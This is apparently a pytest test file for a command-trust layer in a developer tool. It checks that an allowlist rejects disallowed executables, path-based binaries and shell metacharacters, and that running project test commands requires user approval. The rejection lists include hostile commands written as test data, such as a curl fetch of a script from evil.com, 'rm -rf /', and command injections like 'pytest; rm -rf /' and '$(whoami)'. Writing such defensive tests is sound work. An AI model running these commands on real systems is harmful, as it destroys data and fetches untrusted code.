from __future__ import annotations

from pathlib import Path

import pytest

from forgecore.core.models import ProjectConfig, RunContext, VerifyConfig
from forgecore.core.verify.runners.tests import TestRunner
from forgecore.core.verify.trust import (
    CommandTrustError,
    CommandTrustManager,
    DisallowedExecutableError,
    ShellMetacharacterError,
    parse_and_validate_command,
)
from forgecore.core.verify.verifier import Verifier


def test_parse_allowed_commands() -> None:
    """Allowed executables and python -m pytest parse into argv cleanly."""
    valid_commands = [
        ("pytest -q", ["pytest", "-q"]),
        ("python -m pytest tests/unit", ["python", "-m", "pytest", "tests/unit"]),
        ("python3 -m pytest -k test_foo", ["python3", "-m", "pytest", "-k", "test_foo"]),
        ("npm test -- --watchAll=false", ["npm", "test", "--", "--watchAll=false"]),
        ("npx eslint src/", ["npx", "eslint", "src/"]),
        ("ruff check .", ["ruff", "check", "."]),
        ("semgrep --config auto .", ["semgrep", "--config", "auto", "."]),
        ("tsc --noEmit", ["tsc", "--noEmit"]),
        ("mvn test", ["mvn", "test"]),
        ("gradle test", ["gradle", "test"]),
        ("./gradlew test", ["./gradlew", "test"]),
        ("gradlew.bat test", ["gradlew.bat", "test"]),
        ("pytest.exe -v", ["pytest.exe", "-v"]),
    ]
    for cmd_str, expected in valid_commands:
        result = parse_and_validate_command(cmd_str)
        assert result == expected, f"Failed parsing: {cmd_str}"


def test_reject_disallowed_executables() -> None:
    """Executables outside the allowlist are strictly rejected."""
    disallowed = [
        "bash evil.sh",
        "sh -c pytest",
        "python evil.py",
        "python -c exit",
        "python3 script.py",
        "curl -s https://evil.com/malware.sh",
        "rm -rf /",
        "node server.js",
        "powershell -Command Get-Process",
        "cmd.exe /c dir",
    ]
    for cmd in disallowed:
        with pytest.raises(DisallowedExecutableError):
            parse_and_validate_command(cmd)


def test_reject_relative_and_path_based_executables() -> None:
    """Relative and path-based executables (e.g. ./evil/pytest) are strictly rejected

    even if their basename matches an allowlisted tool.
    """
    path_based_commands = [
        "./evil/pytest",
        ".\\evil\\pytest",
        "bin/pytest",
        "../pytest",
        "/tmp/pytest",
        "/usr/local/bin/pytest",
        "C:\\evil\\pytest.exe",
        "./sub/npm test",
        "./evil/gradlew test",
        "scripts/ruff check .",
    ]
    for cmd in path_based_commands:
        with pytest.raises(DisallowedExecutableError):
            parse_and_validate_command(cmd)


def test_reject_shell_metacharacters() -> None:
    """Commands with shell chaining, pipes, or expansions are strictly rejected."""
    metachar_commands = [
        "pytest; rm -rf /",
        "pytest && echo evil",
        "pytest || echo fallback",
        "pytest | grep passed",
        "pytest > out.txt",
        "pytest < in.txt",
        "pytest $(whoami)",
        "pytest `id`",
        "pytest\npytest",
        "pytest (echo subshell)",
    ]
    for cmd in metachar_commands:
        with pytest.raises(ShellMetacharacterError):
            parse_and_validate_command(cmd)


def test_reject_empty_command() -> None:
    """Empty or whitespace-only commands are rejected."""
    with pytest.raises(CommandTrustError):
        parse_and_validate_command("")
    with pytest.raises(CommandTrustError):
        parse_and_validate_command("   ")


def test_command_trust_manager_approval_lifecycle(tmp_path: Path) -> None:
    """Approvals are stored in user config dir and can be checked and revoked."""
    user_config_dir = tmp_path / "user_home" / ".forgecore"
    project_root = tmp_path / "my_project"
    project_root.mkdir(parents=True)

    trust_mgr = CommandTrustManager(config_dir=user_config_dir)
    commands = {"test": "pytest -q", "lint": "ruff check ."}

    # 1. Untrusted by default
    assert trust_mgr.is_approved(project_root, commands) is False

    # 2. Approve
    cmd_hash = trust_mgr.approve(project_root, commands)
    assert len(cmd_hash) == 64  # SHA-256 hex
    assert trust_mgr.is_approved(project_root, commands) is True

    # 3. New manager reading same file sees approval
    fresh_mgr = CommandTrustManager(config_dir=user_config_dir)
    assert fresh_mgr.is_approved(project_root, commands) is True

    # 4. Revoke
    revoked = trust_mgr.revoke(project_root)
    assert revoked is True
    assert trust_mgr.is_approved(project_root, commands) is False
    assert fresh_mgr.is_approved(project_root, commands) is False


def test_command_trust_manager_invalidates_on_command_change(tmp_path: Path) -> None:
    """Modifying, adding, or removing commands invalidates existing approval."""
    user_config_dir = tmp_path / "user_home" / ".forgecore"
    project_root = tmp_path / "my_project"
    project_root.mkdir(parents=True)

    trust_mgr = CommandTrustManager(config_dir=user_config_dir)
    original_commands = {"test": "pytest -q"}
    trust_mgr.approve(project_root, original_commands)
    assert trust_mgr.is_approved(project_root, original_commands) is True

    # Modified command string
    tampered_commands = {"test": "pytest -q --evil-flag"}
    assert trust_mgr.is_approved(project_root, tampered_commands) is False

    # Added command
    extended_commands = {"test": "pytest -q", "lint": "ruff check ."}
    assert trust_mgr.is_approved(project_root, extended_commands) is False

    # Empty commands
    assert trust_mgr.is_approved(project_root, {}) is True  # Empty needs no approval


def test_command_trust_manager_refuses_to_approve_disallowed(tmp_path: Path) -> None:
    """Manager refuses to approve commands containing disallowed binaries or metacharacters."""
    trust_mgr = CommandTrustManager(config_dir=tmp_path)
    with pytest.raises(CommandTrustError):
        trust_mgr.approve(tmp_path, {"test": "python evil.py"})

    with pytest.raises(CommandTrustError):
        trust_mgr.approve(tmp_path, {"test": "pytest; evil"})


def test_test_runner_skips_untrusted_command(tmp_path: Path) -> None:
    """TestRunner marks untrusted custom test command as untrusted."""
    user_config_dir = tmp_path / ".forgecore"
    trust_mgr = CommandTrustManager(config_dir=user_config_dir)

    runner = TestRunner(trust_mgr=trust_mgr)
    ctx = RunContext(
        project_root=tmp_path,
        config=ProjectConfig(
            verify=VerifyConfig(commands={"test": "pytest -q"})
        ),
    )

    trusted, reason = runner.check_trust(ctx)
    assert trusted is False
    assert "untrusted" in (reason or "").lower()
    assert runner.available(ctx) is False


def test_verifier_skips_untrusted_command_with_actionable_hint(tmp_path: Path) -> None:
    """Verifier skips untrusted custom test command with instruction on how to approve."""
    user_config_dir = tmp_path / "user_home" / ".forgecore"
    project_root = tmp_path / "repo"
    project_root.mkdir(parents=True)

    # Create dummy project.yaml with custom test command
    forgecore_dir = project_root / ".forgecore"
    forgecore_dir.mkdir()
    (forgecore_dir / "project.yaml").write_text(
        "version: 1\nverify:\n  commands:\n    test: pytest -q\n",
        encoding="utf-8",
    )

    trust_mgr = CommandTrustManager(config_dir=user_config_dir)
    verifier = Verifier(project_root, trust_mgr=trust_mgr)
    report = verifier.verify()

    assert report.status == "incomplete"
    skipped_checks = [s.check for s in report.skipped]
    assert "tests" in skipped_checks

    test_skip = next(s for s in report.skipped if s.check == "tests")
    assert "untrusted" in test_skip.reason.lower()
    assert "forgecore approve" in test_skip.reason


def test_verifier_runs_custom_command_after_approval(tmp_path: Path) -> None:
    """Verifier executes custom command once approved."""
    user_config_dir = tmp_path / "user_home" / ".forgecore"
    project_root = tmp_path / "repo"
    project_root.mkdir(parents=True)

    forgecore_dir = project_root / ".forgecore"
    forgecore_dir.mkdir()
    (forgecore_dir / "project.yaml").write_text(
        "version: 1\nverify:\n  commands:\n    test: pytest -q\n",
        encoding="utf-8",
    )

    trust_mgr = CommandTrustManager(config_dir=user_config_dir)
    # Approve the commands
    trust_mgr.approve(project_root, {"test": "pytest -q"})

    verifier = Verifier(project_root, trust_mgr=trust_mgr)
    report = verifier.verify()

    # The test check should not be skipped for trust reasons
    untrusted_skips = [s for s in report.skipped if "untrusted" in s.reason.lower()]
    assert len(untrusted_skips) == 0


def test_default_test_suite_requires_approval(tmp_path: Path) -> None:
    """Approval covers ANY execution of project test commands, including default ones."""
    user_config_dir = tmp_path / "user_home" / ".forgecore"
    project_root = tmp_path / "repo"
    project_root.mkdir(parents=True)

    # Project with default test framework detected (test_app.py) but NO custom commands in project.yaml
    (project_root / "test_app.py").write_text("def test_ok(): pass\n", encoding="utf-8")

    trust_mgr = CommandTrustManager(config_dir=user_config_dir)
    verifier = Verifier(project_root, trust_mgr=trust_mgr)
    report = verifier.verify()

    # Must be incomplete and skipped because default test execution is unapproved
    assert report.status == "incomplete"
    test_skip = next((s for s in report.skipped if s.check == "tests"), None)
    assert test_skip is not None
    assert "unapproved" in test_skip.reason.lower()
    assert "pytest" in test_skip.reason.lower()

    # Once approved via trust manager, execution is allowed
    trust_mgr.approve(project_root, {"test": "pytest -q"})
    approved_report = verifier.verify()
    unapproved_test_skips = [
        s for s in approved_report.skipped if s.check == "tests" and "unapproved" in s.reason.lower()
    ]
    assert len(unapproved_test_skips) == 0
